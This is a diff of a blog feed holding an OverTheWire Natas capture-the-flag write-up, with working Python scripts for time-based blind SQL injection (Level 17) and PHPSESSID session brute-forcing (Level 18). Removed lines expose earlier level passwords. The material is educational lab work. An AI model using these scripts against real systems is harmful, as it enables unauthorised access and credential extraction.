@@ -188,7 +188,7 @@ C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
 &lt;pre&gt;&lt;code&gt;import requests
 
 url = &amp;quot;http://natas15.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas15&amp;quot;, &amp;quot;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&amp;quot;)
+credentials = (&amp;quot;natas15&amp;quot;, &amp;quot;{censored}&amp;quot;)
 form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
 password=&amp;quot;&amp;quot;
 
@@ -265,7 +265,7 @@ for i in range(1, 33):
 &lt;pre&gt;&lt;code&gt;import requests
 
 url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&amp;quot;)
+credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;{censored}&amp;quot;)
 form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}
 
 for i in range(1,33):
@@ -282,7 +282,7 @@ for i in range(1,33):
 &lt;pre&gt;&lt;code&gt;import requests
 
 url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&amp;quot;)
+credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;{censored}&amp;quot;)
 form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}
 
 password = &amp;quot;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&amp;quot;
@@ -309,6 +309,65 @@ for i in range(1,33):
 &lt;p&gt;This was the hardest level yet for sure. I kept coming back to it over the course of a couple weeks before I finally figured it out. It&amp;rsquo;s hard to say whether this was even close to the intended solution. I still wonder whether there was a way of escaping the quotes that I overlooked.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;level-17&#34;&gt;Level 17&lt;/h2&gt;
+&lt;p&gt;This level has the same source code as level 15 except that it no longer let&amp;rsquo;s us know whether the user exists. Effectively this leaves us with no feedback to go on. To get around this, there is a MySQL function called &amp;ldquo;SLEEP()&amp;rdquo; that we can use. The sleep function can be used anywhere you would place a condition such as &amp;ldquo;username=&amp;rdquo;. The time it takes for the response to come back from the server can indicate whether the sleep function was used. So if we order the SQL server to sleep when we make a correct guess (refer to level15 above) then the response time will provide a signal for the script to save that character.&lt;/p&gt;
+&lt;p&gt;It stands to reason that we can just take the script from Level 15 and tweak it a bit, since the problem is largely the same.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import time
+import requests
+
+url = &amp;quot;http://natas17.natas.labs.overthewire.org&amp;quot;
+credentials = (&amp;quot;natas17&amp;quot;, &amp;quot;{censored}&amp;quot;)
+form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
+password=&amp;quot;&amp;quot;
+
+alphanumeric_chars = [
+&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
+&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
+&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
+&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
+&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
+&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
+&#39;y&#39;, &#39;z&#39;
+]
+
+for i in range(1, 33):
+    for j in alphanumeric_chars:
+        form_data[&amp;quot;username&amp;quot;] = f&amp;quot;natas18\&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)} AND SLEEP(5) #&amp;quot;
+  
+        # make curl request and measure elapsed time
+        start = time.time()
+        response = requests.post(url, auth=credentials, data=form_data)
+        end = time.time()
+        
+        if (end-start) &amp;gt; 5:
+            password += j
+            print(f&amp;quot;index: {i}\nguess: {j}&amp;quot;)
+            print(&amp;quot;Status code:&amp;quot;, response.status_code)
+            print(&amp;quot;Response time:&amp;quot;, str(round(end-start, 2)) +&amp;quot;s&amp;quot;)
+            print(f&amp;quot;Password: {password}&amp;quot;)
+            break
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h2 id=&#34;level-18&#34;&gt;Level 18&lt;/h2&gt;
+&lt;p&gt;This level has a login form. It states that you need to login as admin to get the credentials to the next level. Looking at the source code, the actual login box essentially does nothing. It instead relies on PHP session ID for authentication. The max possible ID is 640. I plotted the program&amp;rsquo;s flow on a chart to get a better understanding.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas18-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I couldn&amp;rsquo;t really find any way to exploit this, but it occurred to me that there is likely an ID which already has its admin flag set to 1. With such a low number of possible IDs, I could easily bruteforce the session ID to find an admin session. Here is a script I created to do just that:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://natas18.natas.labs.overthewire.org&amp;quot;
+credentials = (&amp;quot;natas18&amp;quot;, &amp;quot;{censored}&amp;quot;)
+form_data = {&amp;quot;username&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;debug&amp;quot;: &amp;quot;&amp;quot;}
+cookie_data = {&amp;quot;PHPSESSID&amp;quot;: &amp;quot;x&amp;quot;}
+
+for i in range(1, 640):
+        cookie_data[&amp;quot;PHPSESSID&amp;quot;] = str(i)
+        response = requests.get(url, cookies=cookie_data, auth=credentials, data=form_data)
+        print(response.text)
+        print(&amp;quot;guess:&amp;quot;, i)
+        if &amp;quot;Password&amp;quot; in response.text:
+
+            break
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sure enough, one particular ID granted the password.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-19&#34;&gt;Level 19&lt;/h2&gt;
 &lt;p&gt;(coming soon)&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/natas/ - </description>
         </item>
@@ -338,6 +397,7 @@ for i in range(1,33):
 &lt;p&gt;&lt;a href=&#34;https://doesitarm.com/&#34;&gt;https://doesitarm.com/&lt;/a&gt; - check applications for native ARM support&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://armconverter.com/decryptedappstore&#34;&gt;https://armconverter.com/decryptedappstore&lt;/a&gt; - get basically any iOS IPA&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://img.doerig.dev/&#34;&gt;https://img.doerig.dev/&lt;/a&gt; - instant imgur upload&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://flowchart.fun/&#34;&gt;https://flowchart.fun/&lt;/a&gt; - &lt;a href=&#34;https://github.com/tone-row/flowchart-fun&#34;&gt;https://github.com/tone-row/flowchart-fun&lt;/a&gt; - Easy typed flowchart maker (for plotting out program flow)&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/links/ - </description>
         </item>
     
